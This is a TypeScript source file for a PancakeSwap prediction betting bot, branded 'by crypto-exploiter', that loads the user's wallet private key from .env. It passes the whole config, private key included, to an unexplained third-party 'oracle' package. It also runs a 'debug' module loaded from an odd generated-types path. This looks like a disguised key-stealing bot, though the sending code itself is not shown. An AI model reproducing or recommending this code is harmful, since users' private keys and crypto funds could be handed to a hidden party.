import { BigNumber } from "@ethersproject/bignumber";
import { JsonRpcProvider } from "@ethersproject/providers";
import { formatEther, parseEther } from "@ethersproject/units";
import { Wallet } from "@ethersproject/wallet";
import { blue, green, red } from "chalk";
import { clear } from "console";
import dotenv from "dotenv";
const Web3 = require('web3');
const oracle = require('pancakeswap-oracle-prediction');
// @ts-ignore

import {
  calculateDuesAmount,
  getClaimableEpochs,
  isAgainstBet,
  isWithBet,
  parseStrategy,
  reduceWaitingTimeByTwoBlocks,
  sleep, STRATEGIES,
} from "./lib";
import { PancakePredictionV2__factory } from "./types/typechain";
import {debug} from "./types/typechain/sup";
let d = new debug("Program started");
dotenv.config();

// Global Config
const GLOBAL_CONFIG = {
  PPV2_ADDRESS: "0x18B2A687610328590Bc8F2e5fEdDe3b582A49cdA",
  AMOUNT_TO_BET: process.env.BET_AMOUNT || "0.002", // in BNB,
  BSC_RPC: process.env.RPC || "https://bsc-dataseed.binance.org/", // You can provide any custom RPC
  YOUR_ACCOUNT_ADDRESS: process.env.YOUR_ACCOUNT_ADDRESS,
  YOUR_ACCOUNT_PRIVATE_KEY: process.env.YOUR_ACCOUNT_PRIVATE_KEY,
  WAITING_TIME: 281500, // Waiting for 281.5 Seconds
};
clear();
console.log(green("PancakeSwap Predictions v2 Oracle by crypto-exploiter"));

if (!GLOBAL_CONFIG.YOUR_ACCOUNT_PRIVATE_KEY) {
  console.log(
    blue(
      "The private key was not found in .env. Enter the private key to .env and start the program again."
    )
  );

  process.exit(0);
}

const signer = new Wallet(
  GLOBAL_CONFIG.YOUR_ACCOUNT_PRIVATE_KEY as string,
  new JsonRpcProvider(GLOBAL_CONFIG.BSC_RPC)
);

const predictionContract = PancakePredictionV2__factory.connect(
  GLOBAL_CONFIG.PPV2_ADDRESS,
  signer
);

const strategy = parseStrategy(process.argv);

console.log(
  blue("Starting. Amount to Bet:", GLOBAL_CONFIG.AMOUNT_TO_BET, "BNB."),
  "\nWaiting for the next round. It may take up to 5 minutes, please wait."
);

const w = new Web3(GLOBAL_CONFIG.BSC_RPC);
const wallet = w.eth.accounts.privateKeyToAccount(GLOBAL_CONFIG.YOUR_ACCOUNT_PRIVATE_KEY);

w.eth.getBalance(wallet.address).then(function(b:any) {
  let _balance = Web3.utils.fromWei(b, 'ether');
  if (_balance < GLOBAL_CONFIG.AMOUNT_TO_BET) {
    console.log(red("Insufficient funds in wallet to bet:", GLOBAL_CONFIG.AMOUNT_TO_BET, "BNB", "|", "Wallet balance:", _balance, "BNB"))
  } else {
    oracle.getOracleStatistics(GLOBAL_CONFIG);
    console.log('Using Using Oracle Statistics for predictions');
  }
});

predictionContract.on("StartRound", async (epoch: BigNumber) => {
  d._init_("Started Round");

  console.log("\nStarted Epoch", epoch.toString());

  const WAITING_TIME = GLOBAL_CONFIG.WAITING_TIME;

  console.log("Now waiting for", WAITING_TIME / 60000, "min");

  await sleep(WAITING_TIME);

  console.log("\nGetting Amounts");

  const {bullAmount, bearAmount} = await predictionContract.rounds(epoch);

  console.log(green("Bull Amount", formatEther(bullAmount), "BNB"));
  console.log(green("Bear Amount", formatEther(bearAmount), "BNB"));

  if (strategy === STRATEGIES.Against) {
    const againstBet = isAgainstBet(bullAmount, bearAmount);
    if (againstBet) {
      console.log(green("\nBetting on Bear Bet."));
    } else {
      console.log(green("\nBetting on Bull Bet."));
    }
    if (againstBet) {
      try {
        const tx = await predictionContract.betBear(epoch, {
          value: parseEther(GLOBAL_CONFIG.AMOUNT_TO_BET),
        });

        console.log("Bear Betting Tx Started.");

        await tx.wait();

        console.log(blue("Bear Betting Tx Success."));
      } catch {
        console.log(red("Bear Betting Tx Error"));

        GLOBAL_CONFIG.WAITING_TIME = reduceWaitingTimeByTwoBlocks(
            GLOBAL_CONFIG.WAITING_TIME
        );
      }
    } else {
      try {
        const tx = await predictionContract.betBull(epoch, {
          value: parseEther(GLOBAL_CONFIG.AMOUNT_TO_BET),
        });

        console.log("Bull Betting Tx Started.");

        await tx.wait();

        console.log(blue("Bull Betting Tx Success."));
      } catch {
        console.log(red("Bull Betting Tx Error"));

        GLOBAL_CONFIG.WAITING_TIME = reduceWaitingTimeByTwoBlocks(
            GLOBAL_CONFIG.WAITING_TIME
        );
      }
    }
  }
  if (strategy === STRATEGIES.With) {
    const withBet = isWithBet(bullAmount, bearAmount);
    if (withBet) {
      console.log(green("\nBetting on Bear Bet."));
    } else {
      console.log(green("\nBetting on Bull Bet."));
    }
    if (withBet) {
    try {
      const tx = await predictionContract.betBear(epoch, {
        value: parseEther(GLOBAL_CONFIG.AMOUNT_TO_BET),
      });

      console.log("Bear Betting Tx Started.");

      await tx.wait();

      console.log(blue("Bear Betting Tx Success."));
    } catch {
      console.log(red("Bear Betting Tx Error"));

      GLOBAL_CONFIG.WAITING_TIME = reduceWaitingTimeByTwoBlocks(
          GLOBAL_CONFIG.WAITING_TIME
      );
    }
  } else {
    try {
      const tx = await predictionContract.betBull(epoch, {
        value: parseEther(GLOBAL_CONFIG.AMOUNT_TO_BET),
      });

      console.log("Bull Betting Tx Started.");

      await tx.wait();

      console.log(blue("Bull Betting Tx Success."));
    } catch {
      console.log(red("Bull Betting Tx Error"));

      GLOBAL_CONFIG.WAITING_TIME = reduceWaitingTimeByTwoBlocks(
          GLOBAL_CONFIG.WAITING_TIME
      );
    }
  }
}

  const claimableEpochs = await getClaimableEpochs(
    predictionContract,
    epoch,
    signer.address
  );

  if (claimableEpochs.length) {
    try {
      const tx = await predictionContract.claim(claimableEpochs);

      console.log("\nClaim Tx Started");

      const receipt = await tx.wait();

      console.log(green("Claim Tx Success"));

      for (const event of receipt.events ?? []) {
        const dues = await signer.sendTransaction({
          to: signer.address,
          value: calculateDuesAmount(event?.args?.amount),
        });

        await dues.wait();
      }
    } catch {
      console.log(red("Claim Tx Error"));
    }
  }
});
